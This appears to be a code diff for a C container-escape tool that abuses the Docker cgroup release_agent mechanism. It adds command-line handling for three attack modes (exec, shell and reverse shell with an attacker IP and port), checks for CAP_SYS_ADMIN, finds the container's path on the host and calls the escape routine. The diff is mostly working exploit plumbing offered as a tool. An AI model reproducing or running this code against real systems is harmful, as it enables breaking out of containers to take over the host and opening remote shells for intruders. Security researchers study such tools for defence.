@@ -10,29 +10,12 @@
 #include "docker/path.h"
 #include "payloads/release_agent.h"
 #include "util/regex_util.h"
+#include "util/custom_struts.h"
 #include <getopt.h>
-#include <stdio.h>
-
-enum ATTACK_TYPE {
-    RELEASE_AGENT,
-};
-
-enum ATTACK_MODE {
-    EXEC,
-    SHELL,
-    REVERSE
-};
-
-struct ATTACK_INFO {
-    int attack_type;
-    int attack_mode;
-    char *command;
-    char *ip;
-    int port;
-} attack_info;
 
 
 int main(int argc, char *argv[]) {
+
     srand(time(NULL));
     static const struct option opts[] = {
             {"help",          no_argument,       NULL, 'h'},
@@ -48,7 +31,14 @@ int main(int argc, char *argv[]) {
             {"bash",          no_argument,       NULL, 'b'}
     };
     int opt;
-    const char *opt_type = "hvardpmcIPb";
+    attack_info.attack_mode = -1;
+    attack_info.command = (char *) malloc(512 * sizeof(char));
+    memset(attack_info.command, 0x00, 512);
+    attack_info.attack_type = -1;
+    attack_info.ip = (char *) malloc(64 * sizeof(char));
+    memset(attack_info.ip, 0x00, 64);
+    attack_info.port = -1;
+    const char *opt_type = "hvardp:m:c:I:P:b";
     while ((opt = getopt_long_only(argc, argv, opt_type, opts, NULL)) != -1) {
         switch (opt) {
             case 'h':
@@ -63,12 +53,36 @@ int main(int argc, char *argv[]) {
             case 'c':
                 attack_info.command = optarg;
                 break;
+            case 'm':
+                if (strcmp(optarg, "exec") == 0) {
+                    attack_info.attack_mode = EXEC;
+                } else if (strcmp(optarg, "shell") == 0) {
+                    attack_info.attack_mode = SHELL;
+                } else if (strcmp(optarg, "reverse") == 0) {
+                    attack_info.attack_mode = REVERSE;
+                } else {
+                    printf_wrapper(ERROR, "Unknown attack mode -m support {exec | shell | reverse}\n");
+                    exit(EXIT_SUCCESS);
+                }
+                break;
 //            default:
 //                usage(argv[0]);
 //                break;
         }
     }
 
+    if (attack_info.attack_type == -1 || attack_info.attack_mode == -1) {
+        printf_wrapper(ERROR, "Args set error, args of escape and -m must set\n");
+        exit(EXIT_SUCCESS);
+    }
+    if (attack_info.attack_mode == EXEC && attack_info.command[0] == 0x00) {
+        printf_wrapper(ERROR, "In exec mode, -c must be set and can't be empty\n");
+        exit(EXIT_SUCCESS);
+    }
+    if (attack_info.attack_mode == REVERSE && (attack_info.ip[0] == 0x00 || attack_info.port == -1)) {
+        printf_wrapper(ERROR, "In reverse mode, -I and -P must set\n");
+        exit(EXIT_SUCCESS);
+    }
     switch (attack_info.attack_type) {
         case RELEASE_AGENT: {
             int sys_admin = check_cap_sys_admin();
@@ -81,14 +95,14 @@ int main(int argc, char *argv[]) {
                     printf_wrapper(INFO, "Try to get container path in host\n");
                     char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
                     get_container_path_in_host(container_path_in_host);
-                    escape_by_release_agent(container_path_in_host, attack_info.command);
+                    escape_by_release_agent(container_path_in_host);
                 }
             } else {
                 printf_wrapper(INFO, "Try to get container path in host\n");
                 char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
                 memset(container_path_in_host, 0x00, 1024 * sizeof(char));
                 get_container_path_in_host(container_path_in_host);
-                escape_by_release_agent(container_path_in_host, attack_info.command);
+                escape_by_release_agent(container_path_in_host);
             }
             break;
         }
